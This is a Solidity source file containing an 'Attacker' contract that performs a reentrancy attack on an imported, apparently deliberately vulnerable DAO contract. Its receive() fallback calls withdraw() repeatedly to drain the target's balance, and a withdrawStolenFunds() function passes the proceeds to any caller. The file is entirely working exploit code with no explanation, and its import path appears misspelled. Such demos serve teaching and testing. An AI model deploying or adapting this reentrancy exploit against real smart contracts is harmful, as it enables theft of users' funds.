// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./VulnerableDOA.sol";
contract Attacker {
    VulnerableDAO public vulnerableDAO;
    uint256 public attackCount;


    event AttackTriggered(uint256 iteration, uint256 amountStolen);


    constructor(VulnerableDAO _vulnerableDAO) {
        vulnerableDAO = _vulnerableDAO;
        attackCount = 0;
    }


    function attack() external payable {
        require(msg.value > 0, "Must send some Ether to deposit");
        require(address(this).balance >= msg.value, "Insufficient balance in contract");
        attackCount = 0;
        vulnerableDAO.deposit{value: msg.value}();
        vulnerableDAO.withdraw();
    }


    receive() external payable {
        if (address(vulnerableDAO).balance > 0) {
            attackCount++;
            emit AttackTriggered(attackCount, msg.value);
            vulnerableDAO.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawStolenFunds() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to withdraw stolen funds");
    }

    
}